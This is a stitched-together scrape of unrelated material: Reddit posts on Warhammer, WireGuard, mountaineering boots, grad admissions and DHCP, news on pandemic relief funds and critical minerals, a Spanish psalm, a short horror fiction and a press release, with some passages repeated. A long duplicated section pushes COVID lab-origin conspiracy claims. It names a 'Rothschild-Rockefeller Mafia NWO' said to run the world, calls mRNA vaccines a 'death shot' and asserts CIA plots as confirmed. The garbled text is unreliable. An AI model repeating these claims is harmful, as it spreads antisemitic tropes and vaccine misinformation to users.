Returning after a 25 year hiatus and trying to exert some impulse control,Drukhari,1i9klmz,2025-01-25 05:58:15,40,0.94,3,https://www.reddit.com/gallery/1i9klmz,yetanotheridentifier,"BEHOLD, MY STUFF","I got into 40K with the launch of 3rd edition - but my teenage self didn’t have the patience to follow through with the painting, beyond a first unit of Kabalites and a Raider (images 1-3)… Other distractions meaning my warhammer ended up in the loft for “if my kids were interested “.

Fast forward 25 years and I find that there are a number of other dads at the local school with dusty collections, who reintroduced me via kill team. As such, I’ve spent the last ~6 months dutifully stripping and repainting, slowly working my way through my pile of shame/opportunity…

My impulse control has never been great, but I’m just about managing to stick to only purchasing one unit for every one I finish. I do find myself with a very battleline/infantry heavy force though - boarding actions has at least let me get them to the table.

I’ve got a couple more units of wyches to finish, then I’ll probably do another 90s raider and reavers and a new unit of scourges. Hoping that gives me a playable if not super competitive 1k list with some options. Even if work and parenting means this takes 6 months longer…

So I have a couple of questions:
1. How should I build my scourges - I am a believer in wysiwyg, 4x dark lances? Haywire blasters? Or a mix?
2. Where to go from there? I would love a court or beast master, but well documented availability issues probably prevent that. I’ve got the mandrakes kill team that will swap in for the 90s ones (who have 25mm bases) and have a combat patrol so could look at the ravager?

Appreciate any thoughts / comments / shared experiences of re-entering the hobby."

My current plan is to setup a WireGuard server in a vps and then forward the traffic into my servers (via more WireGuard). I want to do it this way as it's easier to manage all the client connections this way and it helps simplify some site to site connections I have. The questions I have about this are 1) what are the security implications about using an external root ca? I'm not the most knowledgeable about that hence why I went the full self hosted route as no one would know my internal ips and services. I am probably overthinking it but I know better than to not ask questions. 2) What do others do for there root ca needs? I have been looking at  cloudflare And using there dns/domain service, don't plan on using tunnels or proxy as I already have that setup myself, but I wanted to hear what others use. My current internal domains are service1.home.arpa and service2.home.arpa. I would rather do subdomains vs /service. Sorry for the poor formatting, typing this on mobile.

Rockefeller**, the wealthiest man in the world, was bankrolling a mining operation in a small town north of Seattle named Monte Cristo. Without delay, Trump scoped out the best location there, secured it by filing a bogus mineral claim, built a hotel on the parcel even though it didn’t actually belong to him, and began giving the customers, once again, exactly what they wanted: plenty to eat, lots to drink and of course women.

>When Monte Cristo proved slow to deliver on its promise, Rockefeller publicly reiterated his support while secretly arranging an exit. In the summer of 1897, Trump also decided to cash out and return to Seattle—making him, along with Rockefeller, one of the few investors in Monte Cristo to end up winners rather than losers.

Scarpa Mont Blanc Pro boots for peaks up to 6000m? ,Mountaineering,1i6jvyh,2025-01-21 09:33:43,53,0.97,48,https://i.redd.it/d1yuhl4fycee1.png,Trick-daddy-420,,"I'm only asking here because I'm finding some pretty contradictory information online and while the title is self explanatory, I'll give some context.

I'm a long time outdoor sport enthusiast (climbing, hiking, skiing, running, surfing, skateboarding, you name it) looking to get into mountaineering. Seems like Mexico, Ecuador and Peru all have some great beginner to intermediate options and I also am fluent in Spanish which is a huge plus. So this is where these boots would get used. For the time being, I will be sticking to sub-6000m peaks while I learn and get experience. I see some people say a double boot is necessary but then I see other people saying these would be fine. I guess I'm just looking to hear from people who have actually done climbs like Pico de Orizaba, Iztaccihuatl, Nevado de Toluca, Pisco, Carihuairazo, Cayambe, and/or other similar climbs. 

I plan on renting most of the technical gear at first but I figured boots and clothing would be good to invest in for now, especially because I'm pretty picky with footwear and have a large (US size 12.5/13) high volume and wide foot. Would rather just have my own boots that I know fit me well and are comfortable. I found these practically new Mont Blancs on ebay for around $300 and bought them thinking they would be a good general purpose mountaineering boot but now I'm not even sure if they will work for where I want to go? I really like the fit and they are super comfortable, which is rare for me with non-barefoot style shoes. I don't want to have to sell them and get something else that might not fit as well but I also take frostbite risk seriously. 

If these aren't suitable for the peaks I mentioned, where exactly would these be able to be used? Just looking for some clarification. I appreciate any responses! Stay safe out there, everyone. "

**Here's former CDC director Robert Redfield under oath before the Congress on Wuhan Lab September 2019 events:**

https://www.youtube.com/live/aXXWRaM-sWQ?feature=share


>I will say if you go back and look, it's declassified now, and I'm sure you all have your classified briefings, but the declassified information now: 

>In September of 2019, three things happened in that lab, one is they deleted the sequences, that was highly irregular, researchers don't usually like to do that

>Second thing they did was they changed the command and control of the lab from the civilian control to the military control. Highly unusual, and I've been involved in dual use labs when I was in the military.


>And the third thing they did which I think is really telling is they let a contractor redo the ventilation system in that laboratory. So I think  clearly there was strong evidence that there was a significant event that happened in that laboratory in September. It's now been declassified, you can read it. I'm sure there's more classified information around it.

**Scientist Richard Ebright**

>The relevance of this is that SARS Cov-2, the pandemic virus, is the only virus in its entire genus of SARS-related coronaviruses that contains a fully functional cleavage site at the S1, S2 junction. And here is a proposal from the beginning of 2018 [from Fauci/Gates-funded EcoHealth Alliance] proposing explicitly to engineer that sequence at that position in chimeric lab- generated coronaviruses.

- Richard Ebright, an eminent molecular biologist at Rutgers University, https://archive.is/cCBUw

**Eminent Virologist David Baltimore of CalTech**

>When I first saw the furin cleavage site in the viral sequence, with its arginine [humanized] codons, I said to my wife it was the smoking gun for the origin of the virus. These features make a powerful challenge to the idea of a natural origin for SARS2.

- David Baltimore, an eminent virologist and former president of CalTech, https://archive.is/yalCe


**Former CDC Director Robert Redfield:**

>I was concerned because of the presence of the furin cleavage site that we've talked about and I think it's important to understand what that cleavage site does. That cleavage site totally changes the orientation of the binding domain of COVID, so where before it could not see the ACE2 receptor which is the human receptor, it totally changes the orientation now so it has high affinity for human receptors. So that furin cleavage site bothered me, it didn't seem like it belonged there. 

>And then if you look at the sequences they use in those 12 nucleotides for arginine, where the arginine sequence nucleotide triplet were coded for humans. So why did it have the arginine coding for humans and not bat? It was very disconcerting to me. It looked like this virus was engineered.


>It's not scientifically plausible that this virus went from a bat to humans and became one of the most infectious viruses that we have for humans. 



**Scientist Valentin Bruttel:**

>I tried to raise awareness to this for a year now.
WIV use BsaI and BsmBI/Esp3I sites before to make synthetic WIV1 variants.
And exactly those sites appear in a ""silently introduced, perfect for synthetic assembly"" pattern in SARS2, but non of its nat. relatives.

>seriously, what is the chance that exactly those type IIs restriction appear or disappear through random evolution in a Banal-20-52 like virus?
5-6 precise mutations in 30000bp?
about 1 in 10^20!
SARS2 is clearly synthetic!

**Type Ils restriction sites prove a synthetic origin**

Synthetic RNA viruses are assembled at the DNA level and later transcribed. 30,000 nucleotides cannot be synthesized in one go. These viruses are therefore assembled from smaller, 2- 8,000 nucleotide long pieces. Specific DNA restriction sites are often added to later reassemble the individual building blocks in the correct order. It is also technically possible to hide these interfaces (No See'em), but this was not done in the WIV.

In a 2017 paper, two very specific, particularly suitable type Ils restriction enzymes were used at the WIV. These have the advantage that they can produce different DNA overhangs (sticky ends), which are crucial for a correct assembly of the complete genome: Bsal and BsmBI.

SARS2 shows a Bsal and BsmBI restriction site pattern which is ideal for assembling synthetic viruses and to later replace the spike protein or furin cleavage site.

Bsal and BsmBI restriction sites also exist in closely related viruses (Banal20-52, RaTG13), but these are distributed in such a way that an artificial virus could never be generated using the methods established at WIV 2018/19. 

**The probability that the required 5 synonymous mutations, which enable a synthetic assembly of SARS2, arose purely by chance is less than 1 in 10^20 or about as likely as winning the lottery jackpot 3 times in a row.**

#Congressman Larry McDonald, 1976: 

""The drive of the Rockefellers and their allies (Bill Gates) is to create a one-world government combining supercapitalism and Communism under the same tent, all under their control. Do I mean conspiracy? Yes I do. I am convinced there is such a plot, international in scope, generations old in planning, and incredibly evil in intent.""

#Chapter entitled ""The Rockefeller-Gates Nexus"" from the book ""The Real Anthony Fauci"" by Robert F. Kennedy Jr.

>A century earlier, America’s first billionaire, John D. Rockefeller, had blazed his own wildly successful exit ramp from public loathing, bad press, and antitrust prosecution by launching a medical philanthropy. John D. Rockefeller’s consigliere, Frederick Taylor Gates, served as John D.’s chief business confidant and philanthropic adviser. Frederick Gates helped Rockefeller structure his foundation, advising the mogul that “judicious disposal of his fortune might also blunt further inquiry into its origins.” 

>Practically from his nativity, Bill Gates began coordinating his own foundations’ giving with the Rockefeller organization. In 2018, Bill Gates made the salient observation that “Everywhere our foundation went, we discovered the Rockefeller Foundation had been there first.”

>At the twentieth century’s dawn, Rockefeller’s sanguinary maneuvering—including bribery, price-fixing, corporate espionage, and creating shell companies to conduct illegal activities—had won his Standard Oil Company control of 90 percent of US oil production and made him the richest man in world history with a net worth of over half a trillion in today’s dollars. Senator Robert Lafayette excoriated Rockefeller as “the greatest criminal of the age.” The oil magnate’s father, William “Devil Bill” Rockefeller, was a marauding con artist who supported his family by posing as a doctor and hawking snake oil, opium elixirs, patent medicines, and other miracle cures. In the early 1900s, as scientists discovered pharmaceutical uses for refinery by-products, John D. saw an opportunity to capitalize on the family’s medical pedigree. At that time, nearly half the physicians and medical colleges in the United States practiced holistic or herbal medicine. Rockefeller and his friend Andrew Carnegie, the Big Steel robber baron, dispatched educator Abraham Flexner on a cross-country tour to catalog the status of America’s medical colleges and hospitals.

>The Rockefeller Foundation’s 1910 Flexner Report recommended centralizing America’s medical schooling, abolishing miasma theory, and reorienting these institutions according to “germ theory”—which held that germs alone caused disease— and the pharmaceutical paradigm that emphasized targeting particular germs with specific drugs rather than fortifying the immune system through healthy living, clean water, and good nutrition. With that narrative in hand, Rockefeller financed the campaign to consolidate mainstream medicine, co-opt the burgeoning pharmaceutical industry, and shutter its competition. Rockefeller’s crusade caused the closure of more than half of American medical schools; fostered public and press scorn for homeopathy, osteopathy, chiropractic, nutritional, holistic, functional, integrative, and natural medicines; and led to the incarceration of many practicing physicians.

Bill Gates, Fauci's boss. DARPA. CIA. More importantly, the Rothschild-Rockefeller Mafia NWO at the top who runs the central banks, intelligence agencies, owns all governments and media, and runs the world. Gates is a creation of David Rockefeller. Gates dad was BFF with Rockefeller.


Here's why I believe Bill Gates was involved with COVID:

He invested $55 million in COVID-19 mRNA vaxx creator BioNTech on September 4, 2019 which is 8 days before Wuhan Lab deleted their lab-made coronavirus sequences and COVID-19 began:

>On the 12th Sep 2019, the main database of samples and viral sequences of the Wuhan Institute of Virology went offline. Eventually every single of the 16 virus databases managed by the WIV was taken offline.

https://archive.is/i79eW



**Here's former CDC director Robert Redfield under oath before the Congress on Wuhan Lab September 2019 events:**

https://www.youtube.com/live/aXXWRaM-sWQ?feature=share


>I will say if you go back and look, it's declassified now, and I'm sure you all have your classified briefings, but the declassified information now: 

>In September of 2019, three things happened in that lab, one is they deleted the sequences, that was highly irregular, researchers don't usually like to do that

>Second thing they did was they changed the command and control of the lab from the civilian control to the military control. Highly unusual, and I've been involved in dual use labs when I was in the military.


>And the third thing they did which I think is really telling is they let a contractor redo the ventilation system in that laboratory. So I think  clearly there was strong evidence that there was a significant event that happened in that laboratory in September. It's now been declassified, you can read it. I'm sure there's more classified information around it.

**Scientist Richard Ebright**

>The relevance of this is that SARS Cov-2, the pandemic virus, is the only virus in its entire genus of SARS-related coronaviruses that contains a fully functional cleavage site at the S1, S2 junction. And here is a proposal from the beginning of 2018 [from Fauci/Gates-funded EcoHealth Alliance] proposing explicitly to engineer that sequence at that position in chimeric lab- generated coronaviruses.

- Richard Ebright, an eminent molecular biologist at Rutgers University, https://archive.is/cCBUw

**Eminent Virologist David Baltimore of CalTech**

>When I first saw the furin cleavage site in the viral sequence, with its arginine [humanized] codons, I said to my wife it was the smoking gun for the origin of the virus. These features make a powerful challenge to the idea of a natural origin for SARS2.

- Bill Gates starred in Netflix show ""The Next Pandemic"" in November 2019 with Peter Daszak, the president of EcoHealth, the lab that made COVID. In the show, Gates predicted a coronavirus pandemic originating in a Chinese wet market and promoted mRNA vaccines for the first time ever.

COVID was announced one month later, in December 2019.

Keep in mind, DARPA also funded EcoHealth for the virus and funded Moderna/Pfizer for the mRNA death shot. CIA funded EcoHealth and EcoHealth president Peter Daszak is a confirmed CIA asset. Confirmed by former EcoHealth VP Andrew Huff. And Huff says he got a strange job offering by DARPA in September 2019, when COVID was released. He believes it was to lock in him in a classified status so he couldn't share what he knew about EcoHealth being a CIA front company.

Rockefeller**, the wealthiest man in the world, was bankrolling a mining operation in a small town north of Seattle named Monte Cristo. Without delay, Trump scoped out the best location there, secured it by filing a bogus mineral claim, built a hotel on the parcel even though it didn’t actually belong to him, and began giving the customers, once again, exactly what they wanted: plenty to eat, lots to drink and of course women.

>When Monte Cristo proved slow to deliver on its promise, Rockefeller publicly reiterated his support while secretly arranging an exit. In the summer of 1897, Trump also decided to cash out and return to Seattle—making him, along with Rockefeller, one of the few investors in Monte Cristo to end up winners rather than losers.

I had a 5-10 minute long informal meeting with the prof before applying.

On 10th of Jan, I was invited to create a short video answering some questions on PI of interest and TA suitability.

I haven't heard back yet but it has been communicated that the acceptances/rejections should be out by the end of this month.

I have some steering questions about this program though, and this being my first choice, is making me utterly anxious.

1. When I look through the PIs labs in this department, I find that almost all international students admitted have a degree (undergrad or MS) from US. I come from (an Indian Public University - is certainly not the top University and doesn't compare to top institutes like IISc, IITs, IIScs etc (US news ranked my Uni at 737ish, vs IIT Delhi at 689). However, I worked and interned at one of the CSIR labs for more than 2 years). I see myself at a disadvantage here, I do have great GPA (3.9/4.0) but I am afraid I could get rejected given the historical admits to this program have a better archetype than me.
2. My intended PI said they would reach out to admissions when I told him about receiving an invite from the program to make the video. Does this strengthen my chances? My PI of interest is well-known in the research area and recently got a giant ARPA grant. I am still not sure how strongly/or not he wants me. This is making me utterly nervous.

Can someone please help me understand if I am over-thinking at this point or if I could receive an admit or not? I am really losing my mind and cannot focus on anything else. I really need an admit and work with this PI. I have been having a back-and-forth exchange with this PI since September. I am utterly grateful that he even met me and replied to my emails, given how busy he is. I really admire this person, and getting into this program would be beyond words great for me."

*In her letter to the Common Council, Miller-Williams outlined the following funds that remained unobligated:*

*City Arrears Forgiveness Program — $2,551,886*

*Cultural Institution Support — $30,000*

*509 Michigan Project — $311,949.50*

*Cybersecurity — $1.40*

[Buffalo sues Sicoli Construction over failure to complete project](https://buffalonews.com/news/local/business/development/buffalo-sues-sicoli-construction-over-failure-to-complete-project/article_59f38690-768a-11ee-bca8-cffbe4ce554a.html)

*City officials had announced plans three years ago to renovate and rebuild the two-story brick building just south of the Michigan Street Baptist Church. The 1,100-square-foot former home was part of a stretch of historic Victorian and brick-front residences but was converted in the 1920s to a mixed-use building of first-floor retail and a home on the second floor.*

*The city – working with architects from Carmina Wood Design – planned to restore the storefront to its heyday, reconstruct the interior floors and construct an addition to the south that would enable them to re-create the original historic façade. The two main wings of the building would be connected in the rear, with a courtyard in front, so that it would have a 1,910-square-foot first floor and a 1,100-square-foot second floor.*

*After issuing a request-for-proposals in 2021, the city selected Vision Multi Media Group, parent of WUFO Radio, as its anchor tenant. And it selected Sicoli as the construction contractor in July 2021 following a public bidding process.*

Wifi clients not getting leases,technitium,1i4crsc,2025-01-18 12:38:18,3,1.0,3,https://www.reddit.com/r/technitium/comments/1i4crsc/wifi_clients_not_getting_leases/,Tumleren,,"I've been having some issues with my network and wanted to see if my PiHole was the problem, so I thought I'd switch to Technitium to see if there was any difference.

I've set up a DHCP scope and wired clients succesfully get offered, and accept, leases but no wifi clients are having success. I've tried with my iPhone, my Windows 10 laptop (which works fine when wired) and an old iPhone that hasn't been turned on for 6 months.  

None of them are able to get a lease when Technitium is acting as the DHCP server, but have no problem getting a lease from PiHole's DHCP service.  
Wireless and wired clients are on the same VLAN and subnet as the server, so there should be no issues with firewall rules or the like. Both clients with and without DHCP reservations are affected.  
Thinking there was a problem with my container, I've started a completely new machine for Technitium, but it gives the same result. 

I can see in the Technitium logs that it sends out an offer, but the devices are for some reason not getting a response or accepting it. Here's some excerpts from the logs of the server:

 Do any of you have any idea what the issue could be? I'm posting here since it seems to only happen after the switch to Technitium. When switching back to PiHole, they get adresses immediately. But I don't suppose I can rule out some network issue"

## Salmos Capítulo 137

---

1 JUNTO á los ríos de Babilonia, allí nos sentábamos, y aun llorábamos, acordándonos de Sión.

2 Sobre los sauces en medio de ella colgamos nuestras arpas.

3 Y los que allí nos habían llevado cautivos nos pedían que cantásemos, y los que nos habían desolado nos pedían alegría, diciendo:

4 Cantadnos algunos de los himnos de Sión. ¿Cómo cantaremos canción de Jehová en tierra de extraños?

5 Si me olvidare de ti, oh Jerusalem, mi diestra sea olvidada.

6 Mi lengua se pegue á mi paladar, si de ti no me acordare; si no ensalzare á Jerusalem como preferente asunto de mi alegría.

7 Acuérdate, oh Jehová, de los hijos de Edom en el día de Jerusalem; quienes decían: Arrasadla, arrasadla hasta los cimientos.

8 Hija de Babilonia destruída, bienaventurado el que te diere el pago de lo que tú nos hiciste.

9 Bienaventurado el que tomará y estrellará tus niños contra las piedras.

***BREAKING:*** *The City of Buffalo failed to obligate almost $2.5M in American Rescue Plan (ARP) funds before Dec 31 according to city Comptroller Barbara Miller-Williams. The city will have to return unobligated cash to the federal gov.*

*In the letter above, Miller-Williams asks Scanlon's administration to clarify the status of these funds. She  states: ""These resources could have addressed budgetary gaps or supported essential services for our residents and allowing them to go unspent is a missed opportunity...""*

  
[***UPDATE***](https://x.com/Holly_Journo/status/1880080457787945038)***:*** *Acting Mayor Chris Scanlon ""firmly rejects"" the comptroller's claim that $2.5M in the city's ARP funds remain unencumbered.* 

*Though he does not mention him by name, Scanlon turns on former Commish of Admin and Finance, Delano Dowell saying:  ""It is particularly concerning that the former Comm. of Admin & Finance - now Deputy Comptroller - fails to understand the status of projects he helped oversee...""*

*Dowell submitted his resignation as Commissioner of Administration & Finance back in early Dec. At the time Scanlon said he ""accepted"" Dowell's resignation and thanked him for his ""dedicated service."" This is a significant tonal shift from Scanlon re Dowell.*

CT has $340M in COVID grant interest. Legislators just learned of it,Connecticut,1i2sscf,2025-01-16 11:27:48,195,0.97,113,https://www.reddit.com/r/Connecticut/comments/1i2sscf/ct_has_340m_in_covid_grant_interest_legislators/,ctmirror,Editorialized Title,"Since Congress awarded Connecticut $2.8 billion in emergency pandemic relief nearly four years ago, state government has earned hundreds of millions of dollars through investments.

State legislators learned about this $340 million windfall for the first time Wednesday.

Gov. Ned Lamont’s budget director says the Treasurer’s Office failed to properly move the interest earnings into the General Fund — a problem corrected just a few weeks ago. 

But the administration had been receiving reports on investment earnings four times annually since emergency relief from the American Rescue Plan Act \[ARPA\] arrived in the state’s coffers shortly after March 2021.

And while legislators were scrambling last spring to find additional dollars to bolster higher education, child care, Medicaid and other social services, it remained unclear Wednesday whether the newly reported investment income could be used to help these programs before the fiscal year ends on June 30. 

If not, the funds only would pad an already huge projected state budget surplus. And critics already have begun to attack Lamont and the legislature for using savings programs to amass huge windfalls at the expense of core services.

“The fact that somebody found $340 million under a couch cushion, that nobody knew about, is reprehensible,” House Minority Leader Vincent J. Candelora, R-North Branford, said shortly after legislators were briefed on the issue.

# JAN. 15th, 2025~ USGS, DARPA, and ARPA-E called CriticalMAAS could deliver AI tools to solve USGS challenges

[Collaborative workshop spotlights machine learning to accelerate USGS critical mineral assessments | U.S. Geological Survey](https://www.usgs.gov/news/featured-story/collaborative-workshop-spotlights-machine-learning-accelerate-usgs-critical)

[https:\/\/www.overtdefense.com\/2021\/07\/23\/darpa-autonomous-vehicles-and-rare-earth-minerals\/](https://preview.redd.it/ajnpa7ulkcde1.png?width=331&format=png&auto=webp&s=be0c6f7637fa2837a4ee9032701b9866af8921e3)

Geologists and innovators from the U.S. Geological Survey, the Defense Advanced Research Projects Agency (DARPA), the Advanced Research Projects Agency-Energy (ARPA-E), and other partners came together Jan. 13-17 to collaborate, train, and transition artificial intelligence (AI) tools to streamline mineral resource assessment workflows. 

The [Critical Mineral Assessment with AI Support](https://www.darpa.mil/research/programs/critical-mineral-assessments-with-ai-support) (CriticalMAAS) project set out to develop machine-learning tools to accelerate time-consuming parts of USGS data interpretation and critical mineral assessments. The collaborative five-day “hackathon” workshop served as a launch pad of progress for researchers and USGS users. 

**Graham Lederer, a USGS research geologist and lead for the collaboration with DARPA**, explained that the current process for mineral resource assessments relies heavily on staff-intensive data compilation and analysis.

“Typical mineral resource assessment will take us two years, start to finish, and that’s just for one deposit type, which may contain one mineral commodity in one area of the country,” said Lederer. “To assess 50 commodities across 100 deposit types throughout the entire United States would take many years to complete.” 

The challenge now becomes to augment and accelerate the assessment timeline from years to days.

Since February 2024, CriticalMAAS has conducted a dozen pilot critical mineral assessments, and the results have been promising, said **Erica Briscoe, DARPA Information Innovation Office program manager**. Hackathons have demonstrated the AI tools’ ability to reduce the critical mineral assessment workflow to two and half days, start to finish. 

A hackathon held earlier in 2024 reproduced assessments covering national-scale assessments of zinc, copper, and nickel. Another hackathon that took place at the end of 2024 pivoted to conduct regional assessments of regional Mississippi Valley Type zinc, magmatic cobalt and nickel in the upper U.S.  Midwest, lacustrine lithium, tungsten skarn in Alaska, national peralkaline and carbonatite rare earth elements, and regional and national porphyry copper.

The CriticalMAAS effort has four technical areas: extracting geospatial data from maps and documents; model extraction from knowledge; mineral potential mapping exploiting multi-modal fusion; and human -in-the-loop learning and mixed-initiative learning. 

“So far, we’ve automated the process for pulling data from maps and documents and then compiling the data together and making it analysis-ready,” said Briscoe. “The process is already moving much faster than expected.” 

AI-generated assessments would still need to pass the USGS’s scientific standards and peer review, where the fourth technical area comes into play. 

“Over time, we’ve built more precise and accurate extraction tools because of having human-in-the-loop,” said Briscoe. “This human element also helps create better training data and customizable tools for further specific applications.” 

Following the conclusion of the effort, Lederer says the goal is for USGS scientists to be able to take a usable product of the program and begin implementing it operationally. 

The timing of these tools could not be better, as the [USGS Earth Mapping Resources Initiative (Earth MRI)](https://www.usgs.gov/special-topics/earth-mri) is delivering an unprecedented volume of foundational data crucial to identifying resources of critical and industrial minerals, as well as other earth science applications. 

Earth MRI is a partnership between the USGS and state geological surveys that is revolutionizing our understanding of the nation’s geology and critical mineral resources, which are vital to the U.S. economy and national security.   

“These investments, both to Earth MRI and to CriticalMAAS, are setting the groundwork for future generations of earth scientists,” said Lederer. 

***CriticalMAAS was inspired in part by the Bipartisan Infrastructure Law. Since 2021, BIL has advanced scientific innovation through a $320 million investment in the USGS-Earth MRI to better map the nation’s mineral resources. Through the end of fiscal year 2024, more than $198 million has been obligated for Earth MRI initiatives, propelling efforts to make once-in-a-generation advancements in the nation’s geologic and geophysical data collections and mapping.***

[Alaska and Northern Canada are rich in the minerals and metals essential for clean energy, high tech, and military readiness but are poor in the infrastructure needed to unlock these critical minerals. - \(Arid Ocean at stock.abobe.com](https://preview.redd.it/0m0h2etxlcde1.png?width=1200&format=png&auto=webp&s=0f51c6bbb2b1cdc811b06fc46daf7e0cb37eb253)

# Alaska and Canada's North poised to deliver in the 21st century.

As the United States wrestles to loosen China's grip on the global supply of critical minerals, there is a growing realization that Alaska and Canada's North host rich deposits of the elements essential to the energy transition, national security, and the overall economy.

Antimony and graphite in Alaska, platinum group metals (PGM) and tungsten in the Yukon, cobalt and lithium in Northwest Territories, nickel and uranium in Nunavut, and world-class deposits of copper in British Columbia's Golden Triangle are some of the highlights that barely scratch the surface of the critical mineral potential across the North.

Alaska and Northern Canada, however, are expansive frontiers that lie at and beyond the reaches of North America's transportation and energy infrastructure. This lack of connectivity explains why very large and high-grade mineral deposits remain undeveloped across this region; it also represents the largest challenge to unlocking the critical minerals potential at the northern reaches of North America's supply chains.

The limited transportation and energy infrastructure across the North is reflected in the most recent edition of Fraser Institute's Annual Survey of Mining Companies. While all five jurisdictions were ranked in the top 25% of global mining jurisdiction when it comes to mineral potential, Alaska and Canada's territories all ranked in the bottom half when it comes to infrastructure.

The challenges of developing mines in a frontier region known for its cold and dark winters also offer opportunities in an era when clean energy, emerging technologies, and everyday living are driving up demand for critical minerals.

""The North is often viewed through the lens of its challenges - vast distances, harsh climates, and small populations - but these very factors make the North an exciting opportunity for Canada,"" Northwest Territories Premier R.J. Simpson inked in an October column on unlocking the North's potential.

Policymakers, military leaders, and mining companies are becoming increasingly aware of the rich mineral opportunities found across Alaska and Canada's North and are investing in overcoming the challenges of unlocking the potential across this northern frontier.

[Alaska hosts 49 out of the 50 minerals deemed critical to America's economic well-being and national security but is lacking in much of the infrastructure needed to realize this mineral potential.](https://preview.redd.it/hfac1k09mcde1.png?width=1200&format=png&auto=webp&s=775a00009482d32a6e20b7666b7654d40fc04db6)

# DOD looks North to Alaska

From [Ucore Rare Metals](https://www.miningnewsnorth.com/search/Ucore_Rare_Metals) Inc.'s Bokan Mountain rare earths project on the Southeast Alaska Panhandle to the world-class Red Dog zinc mine about 1,300 miles to the northwest, America's Last Frontier state is undeniably rich in minerals and metals critical to the U.S.

Analysis completed by Data Mine North identified 49 out of the 50 minerals critical to the U.S. in deposits and prospects across the Far North State. This largely untapped mineral potential has captured the attention of many Washington, D.C. decision-makers.

""We must end America's dangerous dependence on China for critical minerals, which are increasingly necessary for alternative energy sources, advanced batteries, and defense technologies,"" said Alaska Sen. Dan Sullivan. ""Alaska can and will lead the way in unleashing America's resource potential.""

The U.S. Department of Defense shares Sen. Sullivan's concerns about China and has taken a keen interest in Alaska's critical minerals potential.

In mid-2023, the Pentagon awarded Graphite One Inc. $37.5 million to finalize a feasibility study for an all-American graphite material supply chain that would connect the world-class Graphite Creek project in western Alaska to America's burgeoning clean energy sector.

""This Department of Defense grant underscores confidence in our strategy to build a 100% U.S.-based advanced graphite supply chain – from mining to refining to recycling,"" said Graphite One President and CEO Anthony Huston.

The Graphite Creek anchoring this supply chain hosts the largest known graphite deposit in the U.S. and one of the largest in the world, according to the U.S. Geological Survey.

Future graphite mined in Alaska will be upgraded to battery-grade anode material and other materials at a processing plant to be built at a former national defense critical minerals storage stockpile site in Ohio.

A feasibility study that outlines the engineering and economic parameters of the Graphite One supply chain is currently underway.

DOD is also keeping close tabs on high-grade antimony projects that have come to the fore in Alaska.

""The antimony and other critical minerals found at Estelle has drawn major interest from the Department of Defense,"" Nova Minerals CEO Chis Gerteisen said when talking about the company's gold-antimony project in Alaska's West Susitna Mineral District.

Nova has identified high-grade targets at Estelle that have the potential to be quickly developed into small mines that could significantly impact North American supplies. Felix Gold Ltd. has identified similar high-grade deposits on its Treasure Creek project near Fairbanks, Alaska.

When paired with a central processing facility capable of upgrading the antimony to products for military and high-tech applications, the Pentagon sees these Alaska projects as near-term solution to America's heavy dependence on China and Russia.

""The company is working closely with various U.S. government agencies, including the Department of Defense, to potentially receive grant funding for fast tracking the Estelle antimony production,"" said Gertiesen. ""The company believes its proposal applications already submitted for available grant funding will be taken under serious consideration, particularly in light of the recent announcement of China export restrictions.""

Donald Neal Thurber stretched out on his deck chair overlooking Funny Lake and thought of Ludwig Sütterlin.

It was a hell of a lake house for a man on a schoolteacher's salary. All courtesy of the Advanced Research Projects Agency, Special Activity District Funny Lake.

Ludwig Sütterlin had originated the concept that *to shape a child's handwriting is to mark them for life*. 

Kaiser Wilhelm II had hired him to artificially engineer different castes within Prussian society in this manner, but it proved disastrous in World War I when soldiers could not read each others' messages. It was eventually quashed for good in 1941 when it had a similar effect on the Axis war effort.

Thurber began to conceive a plan built on Sütterlin's concept, but seemingly more moderate. In fact, far more insidious.

What if a subtly misshapen, yet legible, form of writing could be instilled to distinguish normal elementary schools from those under the control of Funny Lake District? A vaguely unsettling type of penmanship that still offered ARPA plausible deniability?

It could be exploited to trace and catalogue those children through adulthood. Their accomplishments... and their unspeakable deformities and psychoses.

It’s also at risk of ending in the next two years.

Connecticut’s right to counsel program launched in 2022 with $20 million in federal COVID relief money through the American Rescue Plan Act. That funding runs out this year, making right to counsel one of many social service programs in the state facing a fiscal cliff as the one-time dollars run out.

From January 2022 to November 2024, Connecticut has saved about $36.6 million it would have otherwise spent on emergency shelter services, foster care placements and Medicaid spending, among other social services, according to a report published at the end of last month.

The program has also offered legal aid to nearly 5,500 households, representing close to 13,000 individuals, many of them children.

“If they don’t have an attorney to represent them or give them help at any point during these proceedings, the odds of them being evicted go up exponentially,” said Angela Schlingheyde, executive director of the [Connecticut Bar Foundation](https://www.ctbarfdn.org/what-we-do/right-to-counsel.html), which oversees the program.

Evictions and homelessness have a [widespread impact on families](https://ctmirror.org/2022/12/11/ct-eviction-rate-children-effects/), particularly on children. Losing housing can affect physical health, mental health, educational outcomes, access to employment and access to transportation, among other things.

Program organizers are asking for $6.75 million in the biennium budget.

**VANCOUVER, BC / ACCESSWIRE / January 13, 2025 /** Stillwater Critical Minerals Corp. (TSX.V:PGE)(OTCQB:PGEZF)(FSE:J0G) (the ""Company"" or ""Stillwater"") is pleased to provide an overview and status update on its ongoing applications for additional U.S. government grant funding, highlighting its potential to play a pivotal role in strengthening domestic critical mineral supply chains.

Recognizing the increasing geopolitical risks to global supply chains of critical minerals, the U.S. government has steadily expanded its mandate to build domestic supply chains. Priority has been given to securing U.S. inventories and processing capacity for [50 critical minerals](https://pr.report/5wwa) that have been recognized as being essential to the economy and security of the USA which are currently sourced primarily from other countries. Recent federal initiatives, including the establishment of the [Strategic and Critical Materials Board of Directors](https://pr.report/5wwb) by the Department of Defense (""DoD""), demonstrate bipartisan commitment to addressing supply chain vulnerabilities for listed materials.

Stillwater is uniquely positioned to contribute significantly to U.S. supplies with a world-class inventory of critical minerals in the historically productive Stillwater Complex in Montana. The Company's flagship Stillwater West project in south-central Montana is immediately adjacent to Sibanye-Stillwater's (""Sibanye"") operating mines and processing complex. Mining and processing of critical minerals in the Stillwater district dates back to the 1880s and includes the production of chromium in the 1940s and 50s, at times with government subsidies. At present, Sibanye is the largest global producer of platinum group metals outside Russia and South Africa. Building further on the importance of the Stillwater Complex, the Stillwater West project hosts nine metals that have been listed as critical in the U.S., including the largest nickel resource in an active U.S. mining jurisdiction, along with substantial inventories of copper, cobalt, palladium, platinum, rhodium, and chromium, in addition to as yet unquantified amounts of ruthenium and iridium. As such, Stillwater West is considered by the Company to be central to the strategy of securing domestic supply of critical minerals in the USA and reducing the reliance on foreign imports of these metals.

